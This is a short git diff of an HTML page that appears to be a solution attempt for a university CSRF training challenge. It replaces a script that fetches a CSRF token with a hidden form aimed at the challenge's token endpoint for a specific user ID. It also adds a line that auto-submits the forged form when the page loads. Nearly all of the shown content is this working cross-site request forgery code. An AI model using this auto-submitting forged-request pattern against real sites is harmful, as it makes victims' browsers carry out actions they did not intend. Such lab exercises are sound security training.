@@ -6,18 +6,8 @@
 <input type="submit"/>
 </form>
 
+<form name="getter" action="https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=09b532b01c801fd7c25b83fad47c7e8df894b588" method="GET"></form>
 
-<div id="resultsDiv">
-
-</div>
 <script>
-function httpGet(theUrl)
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
-}
-fieldNameElement.innerHTML = httpGet("https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=09b532b01c801fd7c25b83fad47c7e8df894b588")
-// document.csrfForm.submit();
+document.csrfForm.submit();
 </script>
